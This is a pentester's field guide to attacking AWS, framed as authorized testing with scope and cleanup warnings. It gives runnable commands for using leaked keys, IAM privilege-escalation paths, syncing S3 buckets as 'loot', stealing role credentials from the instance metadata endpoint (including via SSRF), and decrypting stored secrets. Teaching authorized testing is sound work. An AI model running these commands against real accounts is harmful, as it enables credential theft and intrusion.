Cloud Pentest · Crash Course

# \~$ AWS from the attacker's side

You already know network and host pentesting. In AWS the terrain moves up a layer: there's almost no "network" to kick down — the attack surface is **IAM, APIs, and misconfiguration**. This is the field reference I'd hand a pentester on day one. Copy commands freely; every block has a copy button.

[00 · mindset](#mindset) [01 · setup](#setup) [02 · who-am-i](#whoami) [03 · scanners](#scanners) [04 · iam / privesc](#iam) [05 · s3](#s3) [06 · ec2 / imds](#ec2) [07 · lambda+](#serverless) [08 · eks / k8s](#eks) [09 · loot](#loot) [10 · opsec](#opsec)

## 00 The mindset shift

The single most useful reframing when coming from traditional pentesting.

- **Everything is an API call.** There is no "exploit" in the buffer-overflow sense. You authenticate, then you call `GetObject`, `AssumeRole`, `RunInstances`. Your weapon is the AWS CLI / SDK. The "vulnerability" is usually a policy that lets you call something you shouldn't.
- **Identity is the perimeter.** A leaked access key is a foothold. The question is never "can I reach the host" but "what can this identity *do*, and what can it turn into."
- **Privilege escalation = IAM graph traversal.** You rarely escalate on a box. You escalate across identities: this role can create a policy version → attach admin → become admin. Map the graph, find the path.
- **The control plane is the kill chain.** CloudTrail logs API calls. Loud enumeration gets caught by GuardDuty. Stealth matters differently than on a network.
- **Blast radius ≠ account boundary.** One role can assume a role in another account. Enumerate trust relationships, not just the account you landed in.

Rosetta stone Nmap → `enumerate-iam` / ScoutSuite. Metasploit → Pacu. BloodHound → `cloudfox` / PMapper. `sudo -l` → `iam simulate-principal-policy`. Pass-the-hash → leaked keys + `sts assume-role`.

## 01 Setup & authenticating as a target identity

Before anything else: get credentials loaded into a named profile so you never fat-finger a key into the wrong engagement.

configure a profile from leaked keys

```
# Keeps the key out of shell history: aws configure PROMPTS for the key and
# reads it over stdin, so it's never a shell command line — nothing for
# ~/.bash_history (or zsh) to record. Paste the key at the prompt, not as an arg.
aws configure --profile target
# paste AWS Access Key ID / Secret / region (us-east-1 is a safe default)

# If you also have a session token (temporary creds):
# NOTE: this passes the token AS AN ARGUMENT, so it DOES land in history.
# Leading space skips it when HISTCONTROL=ignorespace/ignoreboth, or just
# edit ~/.aws/credentials by hand instead.
 aws configure set aws_session_token <TOKEN> --profile target

# Everything from here on: append --profile target
```

Still cleartext on disk Neither method is secret — both write the key in plaintext to `~/.aws/credentials`. "Not in history" ≠ "not readable": anyone who can read that file (or a shared/client box's backups) has your creds. The rule of thumb: interactive prompt → not in history; key-as-argument or `export AWS_SECRET_ACCESS_KEY=…` → in history; either way → still plaintext on disk.

Scope first Confirm your engagement scope covers the account ID you're about to hit. The very first call below prints the account ID — check it against your rules of engagement before you do anything else.

## 02 Who am I? (first five minutes)

You've got creds. Establish identity, then find out what they can do. This is your `whoami` + `id` + `sudo -l`.

identity

```
# Who are these credentials? Account ID, user/role ARN, userId
aws sts get-caller-identity --profile target

# Am I a user or an assumed role? The ARN tells you:
#   arn:aws:iam::123:user/bob         -> IAM user
#   arn:aws:sts::123:assumed-role/... -> temp creds from a role
```

what can I do — if I'm a user

```
aws iam get-user --profile target
aws iam list-attached-user-policies --user-name bob --profile target
aws iam list-user-policies --user-name bob --profile target
aws iam list-groups-for-user --user-name bob --profile target

# The real answer to "can I do X?" without reading every policy:
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123:user/bob \
  --action-names s3:GetObject iam:CreatePolicyVersion sts:AssumeRole \
  --profile target
```

When you can't read your own policies Very common: the identity can *act* but can't call `iam:List*` on itself. Don't give up — brute-force capability by trying actions. That's exactly what `enumerate-iam` (below) automates: it fires hundreds of harmless `List*`/`Describe*`/`Get*` calls and records which succeed.

## 03 The scanners — what to run and when

Four tools cover 90% of the work. Know what each is *for* so you don't just run all of them and drown.

| Tool | Use it for | Noise |
| --- | --- | --- |
| `Prowler` | Broad misconfig & compliance audit across the whole account (hundreds of checks: public S3, open SGs, no MFA, weak policies). Your "give me everything wrong" scan. | loud |
| `ScoutSuite` | Multi-service posture scan that produces a clean browsable HTML report. Great for a fast visual map of what exists and what's exposed. | loud |
| `cloudfox` | Attacker-focused enumeration: "where can I move, what secrets/endpoints/roles exist." Built to surface *paths*, not compliance. This is the one that feels like BloodHound. | medium |
| `Pacu` | Full exploitation framework (Rhino Security). Modules for privesc enumeration, IAM backdooring, data exfil, detection evasion. Your Metasploit. | loud→quiet |
| `enumerate-iam` | Single-purpose: brute-force which API calls your creds can make. Perfect when you can't read your own permissions. | medium |
| `PMapper` | Builds and queries the IAM privilege-escalation *graph*. "Can principal X reach admin?" Best dedicated privesc-path analyzer. | quiet |

install & run the core four

```
# Prowler — full assessment
pip install prowler
prowler aws -p target

# ScoutSuite — browsable HTML report
pip install scoutsuite
scout aws --profile target   # open scoutsuite-report/index.html

# CloudFox — attacker's map (Go binary from releases)
cloudfox aws --profile target all-checks

# Pacu — interactive framework
pip install pacu
pacu
#  > import_keys target
#  > run iam__enum_permissions
#  > run iam__privesc_scan        (dry-run finds escalation paths)
```

enumerate-iam — when you're blind

```
git clone https://github.com/andresriancho/enumerate-iam
pip install -r enumerate-iam/requirements.txt
python enumerate-iam/enumerate-iam.py \
  --access-key AKIA... --secret-key ...
```

## 04 IAM assessment & privilege escalation

The core skill. Everything else is downstream of answering: what can this identity become?

### Reading the account's IAM if you have list/read

enumerate principals & policies

```
# The one call that dumps almost everything IAM in one shot:
aws iam get-account-authorization-details --profile target > iam-dump.json

# Or piece by piece:
aws iam list-users     --profile target
aws iam list-roles      --profile target
aws iam list-policies   --scope Local --profile target   # customer-managed only

# Inspect a specific policy document (decode the JSON):
aws iam get-policy-version --policy-arn <arn> --version-id v3 --profile target
```

### The classic escalation paths memorize these

Rhino Security catalogued \~20 of these. The ones you'll actually see:

- `iam:CreatePolicyVersion` — write a new default version of an existing policy granting `*:*`. Instant admin if you can set it as default.
- `iam:AttachUserPolicy` / `AttachRolePolicy` — just attach `AdministratorAccess` to yourself.
- `iam:PutUserPolicy` / `PutRolePolicy` — inline a permissive policy onto yourself.
- `iam:CreateAccessKey` on another user — mint keys for a more privileged user.
- `iam:PassRole` + `ec2:RunInstances` — launch an instance with an admin role, read its creds from metadata.
- `iam:PassRole` + `lambda:CreateFunction`/`InvokeFunction` — run code as an admin role.
- `iam:UpdateAssumeRolePolicy` — rewrite a role's trust policy to let *you* assume it.
- `sts:AssumeRole` where a role's trust policy is too broad.

PassRole is the crown jewel `iam:PassRole` almost never escalates alone — it needs a service that accepts a role (EC2, Lambda, Glue, CloudFormation, SageMaker…). But paired with one, it's the most common real-world AWS privesc. Always check: *which roles can I pass, and into what service?*

### Let the tools find the path

PMapper — query the privesc graph

```
pip install principalmapper
pmapper --profile target graph create
pmapper --profile target query "preset privesc *"
# "who can reach admin" — with the exact edge chain
pmapper --profile target visualize   # renders the graph
```

## 05 S3 — object storage

Think of a bucket as a remote directory with its own ACL plus a bucket policy plus account-level public-access settings. Misconfig here is the #1 public breach cause.

enumerate & read

```
aws s3 ls --profile target                      # list buckets you can see
aws s3 ls s3://bucket-name --profile target       # list objects
aws s3 sync s3://bucket-name ./loot --profile target # pull everything

# Check the misconfigs that make a bucket dangerous:
aws s3api get-bucket-policy      --bucket b --profile target
aws s3api get-bucket-acl         --bucket b --profile target
aws s3api get-public-access-block --bucket b --profile target

# Can you WRITE? (overwrite a static site, plant a payload)
echo test > t.txt && aws s3 cp t.txt s3://bucket-name/ --profile target
```

Anonymous access Public buckets need no creds at all. Try `aws s3 ls s3://name --no-sign-request`. Unauthenticated read/write is still rampant. Bucket names are a global namespace, so bucket-name guessing (company-backups, company-dev) is valid recon.

## 06 EC2 & the metadata service (IMDS)

"Elastic" in your list = EC2 (Elastic Compute Cloud), the VM service. The attacker's prize here is the instance metadata endpoint, which hands out the instance's role credentials.

enumerate compute

```
aws ec2 describe-instances --profile target \
  --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress,IamInstanceProfile.Arn]'
aws ec2 describe-security-groups --profile target   # find 0.0.0.0/0 rules
aws ec2 describe-volumes --profile target          # snapshots can hold secrets
```

IMDS — run this FROM a compromised instance (or SSRF)

```
# IMDSv1 (no token) — if this works, it's a finding in itself:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
# -> returns AccessKeyId / SecretAccessKey / Token. Export and you ARE the instance role.

# IMDSv2 (token required) — grab a token first:
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

SSRF is the remote path in Any web app on an instance with a server-side request forgery bug lets you reach `169.254.169.254` from the outside and steal role creds — the Capital One breach in a sentence. IMDSv1 being enabled is what makes it trivial; always report it.

## 07 Lambda, Secrets & the quieter services

Where credentials and business logic actually live.

lambda — read code & env vars

```
aws lambda list-functions --profile target
# Env vars frequently hold DB passwords / API keys in plaintext:
aws lambda get-function-configuration --function-name f --profile target
# Download the source to read it:
aws lambda get-function --function-name f --profile target \
  --query 'Code.Location'   # gives a presigned URL to the zip
```

secrets & parameters — grab them directly

```
aws secretsmanager list-secrets --profile target
aws secretsmanager get-secret-value --secret-id name --profile target

aws ssm describe-parameters --profile target
aws ssm get-parameters-by-path --path / --recursive \
  --with-decryption --profile target   # --with-decryption is the magic flag
```

SSM — a shell on instances without SSH

```
# If you have ssm:StartSession, you get an interactive shell
# on any managed instance — no key, no open port 22:
aws ssm start-session --target i-0abc123 --profile target
```

## 08 EKS — Kubernetes on AWS

Your list mentioned Kubernetes. On AWS that's EKS (Elastic Kubernetes Service). The twist: access is governed by *both* IAM and native k8s RBAC, and the boundary between them is where the bugs live.

get into the cluster

```
aws eks list-clusters --profile target
aws eks describe-cluster --name c --profile target

# The key move: if your IAM identity is mapped in the cluster,
# this writes a working kubeconfig for you:
aws eks update-kubeconfig --name c --profile target
kubectl auth can-i --list        # your k8s RBAC — the "sudo -l" of the cluster
kubectl get secrets -A            # k8s secrets are only base64-encoded
```

Two attack directions **IAM → k8s:** your AWS permissions get you a kubeconfig, then native RBAC decides what you can do. **k8s → IAM:** a pod with a service-account role (IRSA) or node access can reach IMDS and pivot back into AWS. Check both. A pod that can reach `169.254.169.254` inherits the node's instance role — the same IMDS trick from section 06, from inside a container.

## 09 Where the loot lives

A triage checklist once you have any foothold. In rough order of payoff:

- **Secrets Manager & SSM Parameter Store** — purpose-built credential stores. First stop.
- **Lambda env vars** — plaintext DB/API creds, constantly.
- **S3 buckets** — backups, `.env` files, Terraform state (`terraform.tfstate` often holds secrets in cleartext), DB dumps.
- **EC2 user-data** — `curl …/latest/user-data`; bootstrap scripts frequently embed secrets.
- **EBS snapshots & RDS snapshots** — if shared public or copyable, restore and mount them.
- **CloudFormation templates & outputs** — `aws cloudformation describe-stacks` often leaks endpoints and parameters.
- **ECR images** — pull container images, inspect layers for baked-in creds.
- **DynamoDB / RDS** — the actual application data, once you can reach it.

## 10 OpSec & staying in scope

Cloud leaves a perfect audit log. Behave accordingly.

- **CloudTrail records every API call** — attribution is trivial for the blue team. Assume everything you do is logged with your ARN and source IP.
- **GuardDuty flags patterns** — mass enumeration, calls from Tor/unusual geographies, `GetCallerIdentity` from a new location, disabled-logging events. Pace yourself; the scanners above can trip it.
- **Prefer read/describe over mutate** during enumeration. Save state-changing calls for when you've confirmed a path and have authorization.
- **Document as you go** — ARN, account ID, action, timestamp, result. Your report needs the exact chain, and so does the client's incident review.
- **Clean up** — any access keys, policies, instances, or functions you created get removed and logged in the report. Leaving a backdoor is a client-trust and legal problem, not a flex.

Authorization Only ever run this against accounts explicitly in your signed scope. Verify the account ID from `get-caller-identity` matches your rules of engagement before the first mutating call. Cross-account assume-role can quietly walk you out of scope — stop and check when an ARN points at an account you weren't given.

A starting field reference, not exhaustive — AWS has \~200 services. Deepen with: `hackingthe.cloud`, the `Rhino Security Labs` blog, `flaws.cloud` / `flaws2.cloud` (free hands-on labs), and `CloudGoat` (Rhino's vulnerable-by-design AWS lab you can deploy and attack). Build the muscle memory on CloudGoat before a live engagement.